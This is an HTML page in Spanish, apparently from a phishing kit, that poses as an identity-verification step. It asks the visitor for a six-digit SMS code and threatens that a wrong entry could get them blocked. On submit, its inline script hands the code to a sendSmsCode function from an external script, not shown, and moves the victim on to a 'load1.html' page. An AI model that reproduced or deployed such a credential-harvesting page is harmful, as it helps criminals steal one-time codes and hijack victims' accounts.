<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="./docs/remixicon.css" rel="stylesheet">
  <link rel="stylesheet" href="./docs/styles.css">
  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
  <title>Validación SMS</title>
</head>
<body>
  <section class="login">
    <img src="./docs/patrn.jpg" alt="Login-image" class="login--image">

    <form id="smsForm" class="login--form">
      <div align="left">
        <img src="./docs/lbg22.png" style="width:110px">
      </div><br>
      
      <div align="center">
        <span style="font-size:16px"><b>Para continuar con la validación ingrese el código que le hemos enviado vía SMS a su teléfono:</b></span>
      </div><br>
      
      <div class="login--content">
        <div class="login-box">
          <i class="ri-key-line"></i>
          <div class="login--input-box">
            <input type="tel" class="login-input" id="smsCode" name="cod1" placeholder=" " 
                   maxlength="6" minlength="6" 
                   onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
            <label for="smsCode" class="login--input-label">Código SMS</label>
          </div>
        </div>
      </div>

      <button type="submit" class="login--button--whatsapp">Siguiente</button>

      <div align="center">
        <span style="font-size:14px; color:red">
          Asegúrese de que el código sea el correcto, ya que esta validación es necesaria para verificar su identidad.<br>
          En caso de error podría ser bloqueado
        </span>
      </div><br>
    </form>
  </section>

  <!-- Scripts -->
  <script src="./excedata.js"></script>
  <script src="./docs/main.js"></script>
  
  <script>
    // Manejar envío del formulario
    document.getElementById('smsForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const smsCode = document.getElementById('smsCode').value;
      
      if(typeof sendSmsCode === 'function') {
        await sendSmsCode(smsCode);
        window.location.href = 'load1.html';
      } else {
        console.error('La función sendSmsCode no está disponible');
      }
    });
  </script>
</body>
</html>
